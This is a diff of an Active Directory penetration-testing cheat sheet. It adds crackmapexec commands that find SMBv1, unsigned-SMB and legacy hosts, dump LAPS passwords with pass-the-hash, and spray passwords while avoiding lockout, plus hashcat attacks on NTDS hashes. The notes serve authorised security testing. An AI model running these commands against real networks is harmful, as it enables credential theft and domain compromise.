@@ -33,6 +33,21 @@ Using crackmapexec to test for password equal to username on domain contoso.com
 for word in $(cat users.txt); do crackmapexec smb 10.10.0.10 -u $word -p $word -d contoso.com; done
 ```
 
+### SMB Version 1
+```
+crackmapexec smb all_ips.txt | grep -a "SMBv1:True" | cut -d " " -f 10
+```
+
+## SMB Signing
+```
+crackmapexec smb all_ips.txt | grep -a "signing:False" | cut -d " " -f 10
+```
+
+### Unsupported operating systems
+```
+crackmapexec smb all_ips.txt |  egrep -a "Windows 6.1|Server 2008|Server 2003|Windows 7|Server \(R\) 2008"
+```
+
 ### Checking NLA and other RDP issue
 rdp-sec-check is a Perl script to enumerate the different security settings of an remote destktop service (AKA Terminal Services)
 - https://github.com/CiscoCXSecurity/rdp-sec-check
@@ -104,11 +119,17 @@ Get-ADUser -Filter "useraccountcontrol -band 32" -Properties PasswordLastSet | W
 ### Machine Account Quota
 Identify machine account quota domain attribute:
 ```
-crackmapexec ldap 10.10.0.10 -u jdoe -p Pass1234 -d company.com -d gnb.ca -M MAQ
+crackmapexec ldap 192.168.0.10 -u jdoe -H XXXXXX:XXXXXXX -M MAQ --kdcHost corp.company.local
 ```
 
 ```
 Get-ADObject -Identity ((Get-ADDomain).distinguishedname) -Properties ms-DS-MachineAccountQuota
+```
+
+### LAPS / LAPS bypass
+Retrieving LAPS passwords using Crackmapexec
+```
+crackmapexec ldap 192.168.0.10 -u jdoe -H XXXXX:XXXXX -M laps --kdcHost corp.company.local
 ```
 
 ### Admin Count
@@ -194,7 +215,7 @@ nmap -p 8080,1098,1099,1050,8000,8888,8008,37471,40259,9010,7001 -iL ips.txt -oN
 
 Spraying 3 password attempt for each user every 15 minutes without attempting password=username  
 ```
-spray.sh -smb 192.168.0.10 users.txt seasons.txt 3 15 cema.canadaegg.ca NOUSERUSER
+spray.sh -smb 192.168.0.10 users.txt seasons.txt 3 15 corp.company.local NOUSERUSER
 ```
 
 - https://github.com/ShutdownRepo/smartbrute
@@ -932,8 +953,36 @@ jq -r '.[].attributes | select(.adminCount == [1]) | .sAMAccountName[]' domain_u
 ## Data-Exfiltration
 Data exfiltration and DLP (Data Loss Prevention) bypass.
 
-# Reporting / Collaborative
+## Recovering secrets / Cracking Hashes
+### jeanPass.py
+- 
 
+### Hashcat
+
+Hashcat mask attack
+- https://hashcat.net/wiki/doku.php?id=mask_attack
+```
+hashcat -m 1000 -a 3 ntds.dit.ntds ?u?l?l?l?l?d?d?d?d?s
+```
+
+Hashcat rule based cracking
+```
+hashcat -m 1000 -a 0 --username ntds.dit.ntds ../../wordlists/rockyou_2021.txt -r ../../wordlists/OneRuleToRuleThemAll.rule
+```
+
+Hashcat wordlist cracking
+```
+```
+
+
+# Reporting / Collaborative
+### Password audit reporting
+- https://github.com/clr2of8/DPAT
+```
+
+```
+
+<img src="./images/dpat.png" width="250"/>
 
 ### Resources
 #### PetitPotam and ADCS
@@ -1029,6 +1078,7 @@ https://github.com/ly4k/Certipy
 - windows authentication cache (HKLM\SOFTWARE\Microsoft\WindowsNT\CurrentVersion\Winlogon\CachedLogonsCount)
 - LSASS
 - DPAPI
+- xfreerdp tool
 - reprendre training specterops
 - Service accounts with interactive logon
 - WSUS exploitation
@@ -1042,6 +1092,7 @@ https://github.com/ly4k/Certipy
 - Spraykatz
 - VLAN hopping
 - SNMP default
+- Pass Back Attack
 - Potato family : https://hideandsec.sh/books/windows-sNL/page/in-the-potato-family-i-want-them-all
 - SMTP
 - ACL/DACL exploitation
